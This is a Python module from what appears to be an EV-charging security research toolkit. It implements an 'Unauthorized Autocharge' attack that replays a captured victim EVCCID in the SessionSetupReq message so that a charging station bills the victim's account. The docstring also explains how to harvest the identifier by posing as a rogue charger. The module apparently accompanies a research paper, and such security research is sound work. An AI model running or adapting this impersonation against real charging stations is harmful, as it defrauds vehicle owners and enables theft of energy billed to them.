"""
Attack A1 — Unauthorized Autocharge via EVCCID impersonation.

Paper reference: `paper/4、Methodology.tex` §Attack 1.

What it does
------------
Runs HotWire as a PEV and overrides the outbound ``SessionSetupReq``'s
``EVCCID`` field to a value supplied by the operator. When this value is a
previously-captured victim identifier and the target station has Autocharge
enabled, the station's backend matches the EVCCID to the victim account and
authorizes the session — billing the victim for all energy delivered.

This playbook performs **no capture step**; you need to have the victim's
EVCCID in hand already (e.g. by running HotWire as a rogue EVSE next to the
victim vehicle and reading it out of their ``SessionSetupReq`` — the EVCCID
shows up in the EVSE GUI's StatusPanel the moment the vehicle connects).

Clarification vs. the paper
---------------------------
The paper describes MAC address spoofing at the *modem firmware layer*
(QCA7005 PIB register writes). HotWire implements the attack at the
*protocol layer* — the EXI-encoded ``SessionSetupReq`` payload carries the
EVCCID, and that's what charging stations authenticate against. From the
charging station's backend perspective the two approaches are
indistinguishable; both show the station the victim's EVCCID inside
``SessionSetupReq``. See README.md §"How MAC / EVCCID spoofing works".
"""
from __future__ import annotations

import re
from dataclasses import dataclass

from ..core.modes import C_PEV_MODE
from .base import Attack


_EVCCID_PATTERN = re.compile(r"^[0-9a-fA-F]{12}$")


@dataclass
class AutochargeImpersonation(Attack):
    """Sets PEV.SessionSetupReq.EVCCID to a chosen 12-hex value."""

    evccid: str = ""

    def __post_init__(self) -> None:
        if not _EVCCID_PATTERN.fullmatch(self.evccid):
            raise ValueError(
                f"EVCCID must be 12 hex characters (6 bytes); got '{self.evccid}'"
            )
        canonical = self.evccid.lower()
        self.name = "A1 — Unauthorized Autocharge"
        self.mode = C_PEV_MODE
        self.description = (
            f"Replay captured EVCCID {canonical} against an Autocharge-"
            f"enabled charging station. The station will match the EVCCID to "
            f"the victim's pre-registered account and authorize the session."
        )
        self.overrides = {
            "SessionSetupReq": {"EVCCID": canonical},
        }
